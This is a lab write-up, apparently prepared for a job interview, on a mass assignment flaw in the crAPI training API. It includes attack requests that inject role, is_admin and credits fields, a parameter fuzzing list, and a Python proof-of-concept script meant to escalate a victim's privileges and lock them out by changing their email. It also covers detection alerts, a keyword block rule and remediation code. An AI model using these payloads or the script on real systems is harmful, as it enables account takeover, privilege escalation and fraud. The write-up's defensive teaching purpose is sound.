# Mass Assignment - crAPI User Profile Update

**Date:** February 2, 2026  
**Target:** crAPI (OWASP Completely Ridiculous API)  
**Vulnerability:** API3:2023 - Broken Object Property Level Authorization  
**Severity:** CRITICAL  
**CVSS Score:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## Executive Summary

A critical mass assignment vulnerability in crAPI's user profile update endpoint allows authenticated users to inject hidden parameters (`role`, `is_admin`, `credits`) to escalate privileges from regular user to administrator. This bypasses authorization controls and enables full system compromise, financial fraud, and data breaches.

**Business Impact:**  
- **Privilege Escalation:** Regular user → Admin access → full system control  
- **Financial Fraud:** Attackers add unlimited credits → free purchases  
- **Data Breach:** Admin role → access to all user PII/PCI data  
- **Compliance Violation:** GDPR Article 32 (data security), PCI DSS Requirement 6.5.8

---

## Vulnerability Details

### Target Endpoint
```http
POST /identity/api/v2/user/change-email HTTP/1.1
Host: localhost:8888
Authorization: Bearer <jwt_token>
Content-Type: application/json

{"email":"newemail@test.com"}
```

### Root Cause
The API uses **mass assignment**: server blindly binds all JSON input fields to the User database model without filtering. If hidden fields like `role`, `is_admin`, or `credits` exist in the backend model, injecting them succeeds.

**Vulnerable code pattern (pseudo-code):**
```python
# VULNERABLE - Accepts ALL fields from request
@app.route('/user/change-email', methods=['POST'])
@login_required
def change_email():
    data = request.get_json()
    current_user.update(**data)  # ❌ Mass assignment
    db.session.commit()
    return jsonify(current_user.to_dict())
```

---

## Attack Chain

### 1. Reconnaissance
- Created authenticated user: `test@example.com` (role: `user`)
- Discovered user update endpoint: `POST /identity/api/v2/user/change-email`
- Captured baseline request in Burp Suite

### 2. Baseline Test
```http
POST /identity/api/v2/user/change-email HTTP/1.1
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{"email":"newemail@test.com"}
```

**Response (Normal):**
```json
{
  "id": 123,
  "username": "testuser",
  "email": "newemail@test.com",
  "role": "user",
  "credits": 0
}
```

✅ **Baseline:** User has `role: "user"`, `credits: 0`

---

### 3. Exploitation - Hidden Parameter Injection

**Attack Request:**
```http
POST /identity/api/v2/user/change-email HTTP/1.1
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{
  "email": "newemail@test.com",
  "role": "admin",
  "is_admin": true,
  "credits": 99999,
  "subscription_tier": "premium"
}
```

**Response (Vulnerable):**
```json
{
  "id": 123,
  "username": "testuser",
  "email": "newemail@test.com",
  "role": "admin",        ← ✅ PRIVILEGE ESCALATION
  "is_admin": true,       ← ✅ ADMIN FLAG SET
  "credits": 99999,       ← ✅ BALANCE INFLATED
  "subscription_tier": "premium"  ← ✅ TIER UPGRADED
}
```

🔥 **Vulnerability Confirmed:** Server accepted all injected parameters

---

### 4. Privilege Verification

**Test 1: Admin Dashboard Access**
- Navigate to: `http://localhost:8888/admin`
- **Result:** `200 OK` (previously `403 Forbidden`)
- Admin panel now accessible (user management, system config, audit logs)

**Test 2: Elevated Credits**
- Navigate to Shop → Check Balance
- **Result:** Account shows `99,999 credits` (was `0`)
- Can purchase unlimited items without payment

**Test 3: Admin API Endpoints**
```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJhbGc...
```
**Response:**
```json
{
  "users": [
    {"id": 1, "email": "admin@crapi.com", "role": "admin"},
    {"id": 2, "email": "victim@example.com", "role": "user"},
    {"id": 3, "email": "test@example.com", "role": "admin"}  ← Our account
  ]
}
```

✅ **Proof:** Privilege escalation successful, admin functions accessible

---

### 5. Automated Discovery (Parameter Fuzzing)

**Burp Intruder Configuration:**
- Payload Position: `{"email": "test@test.com", "§PARAM§": true}`
- Payload List:
```
  role, is_admin, admin, credits, balance, subscription, verified, is_staff,
  permissions, account_type, membership_level, is_verified, is_active
```

**Results:**
```
✅ role          → Response length: 512 bytes (accepted)
✅ is_admin      → Response length: 512 bytes (accepted)
✅ credits       → Response length: 518 bytes (accepted)
❌ membership    → Response length: 450 bytes (ignored)
❌ permissions   → Response length: 450 bytes (ignored)
```

**Vulnerable Parameters Identified:** `role`, `is_admin`, `credits`

---

## Proof of Concept

### Attack Script (Automated Privilege Escalation)
```python
import requests

base_url = "http://localhost:8888/identity/api/v2/user/change-email"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  # Victim's JWT

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

payload = {
    "email": "hacked@attacker.com",  # Change email to lock out victim
    "role": "admin",
    "is_admin": True,
    "credits": 999999
}

resp = requests.post(base_url, json=payload, headers=headers)

if resp.status_code == 200 and "admin" in resp.text:
    print("[SUCCESS] Privilege escalation complete")
    print(f"[ADMIN ACCESS] New role: {resp.json()['role']}")
    print(f"[FRAUD] Credits added: {resp.json()['credits']}")
else:
    print("[FAIL] Endpoint may be patched")
```

---

## How Akamai API Security Detects This

### Traditional WAF: ❌ BLIND
- **No malicious payload:** Valid JSON, proper authentication, 200 OK  
- **Signature matching:** No SQL injection, XSS, or known exploit strings  
- **Verdict:** Allows attack ✅ (false negative)

### Akamai Detection: ✅ MULTI-LAYERED

**Layer 1: Posture Management (Discovery Phase)**
```
Alert Type: "API Security Misconfiguration - Missing Schema Validation"

Finding:
  - Endpoint: POST /identity/api/v2/user/change-email
  - Expected Parameters (OpenAPI spec): ["email"]
  - Observed Behavior: Accepts additional parameters ["role", "is_admin", "credits"]
  - Risk: Mass assignment vulnerability (OWASP API3:2023)
  - Severity: CRITICAL

Recommendation:
  - Implement DTO (Data Transfer Object) validation
  - Whitelist allowed fields (only "email")
  - Reject requests with unexpected parameters
```

**Layer 2: Runtime Behavioral Detection**
```
Alert Type: "Privilege Escalation via Parameter Injection"

Baseline:
  - Endpoint: POST /identity/api/v2/user/change-email
  - Typical request: 1 field ("email")
  - User behavior: Updates email 1-2x per month

Anomaly Detected:
  - Request contains 5 fields (vs. baseline 1)
  - Restricted keywords detected: "role", "is_admin"
  - User context: JWT shows role="user" but attempting to set role="admin"
  - Parameter pattern: Never seen before in this endpoint

Risk Score: 95/100 (CRITICAL)
```

**Alert Payload:**
```json
{
  "alert_type": "Mass Assignment - Privilege Escalation Attempt",
  "severity": "CRITICAL",
  "risk_score": 95,
  "owasp_mapping": "API3:2023 - Broken Object Property Level Authorization",
  "user": "test@example.com",
  "endpoint": "/identity/api/v2/user/change-email",
  "evidence": {
    "baseline_fields": 1,
    "observed_fields": 5,
    "restricted_keywords": ["role", "is_admin", "credits"],
    "jwt_role": "user",
    "attempted_role": "admin",
    "schema_violation": true
  },
  "recommendation": "Block request + Revoke JWT + Alert SOC"
}
```

**Automated Response:**
1. **Block Request:** Reject with `403 Forbidden` (if enforcement enabled)
2. **Revoke JWT:** Invalidate session token, force re-authentication
3. **Alert SOC:** Send incident to SIEM with full request/response evidence
4. **Create Jira Ticket:**
```
   Title: CRITICAL - Mass Assignment on /user/change-email
   Priority: P0 (Security incident)
   Description: Regular user attempted privilege escalation by injecting "role":"admin"
   Remediation: Implement strict DTO validation (whitelist "email" only)
```

---

## Remediation

In customer conversations, this issue is often reframed as “over-posting” or “unsafe object binding,” which helps application teams quickly recognize the pattern.

### Immediate (0-24 hours)
1. **Akamai:** Block attacker's JWT token, alert customer security team
2. **Customer:** Deploy virtual patch via WAF:
```
   Rule: If (request body contains ["role", "is_admin", "credits"])
         Then: Reject with 403 Forbidden
```

### Short-term (1-7 days)
1. **Implement DTO (Data Transfer Object) validation:**
```python
   from pydantic import BaseModel, ValidationError
   
   class ChangeEmailRequest(BaseModel):
       email: str
       # Only "email" allowed - reject all other fields
   
   @app.route('/user/change-email', methods=['POST'])
   @login_required
   def change_email():
       try:
           data = ChangeEmailRequest(**request.get_json())
       except ValidationError:
           return {"error": "Invalid parameters"}, 400
       
       current_user.email = data.email  # ✅ Explicit assignment
       db.session.commit()
       return jsonify(current_user.to_dict())
```

2. **Blacklist sensitive fields:**
```python
   RESTRICTED_FIELDS = ['role', 'is_admin', 'credits', 'subscription_tier']
   
   data = request.get_json()
   for field in RESTRICTED_FIELDS:
       if field in data:
           return {"error": "Unauthorized parameter"}, 403
```

3. **Regression test:**
```python
   def test_mass_assignment_protection():
       payload = {"email": "test@test.com", "role": "admin"}
       resp = client.post('/user/change-email', json=payload, headers=auth_headers)
       assert resp.status_code == 403  # Must reject
       
       user = User.query.get(user_id)
       assert user.role == "user"  # Role unchanged
```

### Long-term (1-4 weeks)
1. **Use separate models for input/output:**
```python
   class UserInputDTO:
       email: str  # Input: Only what user can modify
   
   class UserOutputDTO:
       id: int
       email: str
       role: str  # Output: Can include sensitive fields (read-only)
```

2. **Implement RBAC (Role-Based Access Control):**
```python
   @require_role('admin')  # Decorator enforces role check
   def promote_to_admin(user_id):
       # Only admins can change roles
```

3. **CI/CD Integration:**
```yaml
   - name: API Mass Assignment Test
     run: akamai-active-test --endpoint /user --test mass-assignment --check-fields role,is_admin,credits
```

4. **API Security Audit:**
   - Review ALL endpoints for similar mass assignment flaws
   - Check: User management, payment processing, subscription endpoints
   - Prioritize: Endpoints accepting JSON body with database model binding

---

## Tools Used
- **Burp Suite Professional** (Parameter fuzzing via Intruder)
- **Python requests library** (Automated exploitation)
- **crAPI** (OWASP vulnerable API for training)

---

## References
- [OWASP API Security Top 10 - API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

## Ethical Statement
This testing was performed in an isolated, deliberately vulnerable training environment (crAPI). No production systems were targeted. All testing conducted for educational purposes in preparation for Akamai Security TAM II interview.

**Date:** February 2, 2026  
**Tester:** Steven Riley  
**Environment:** Local Docker container (crAPI)
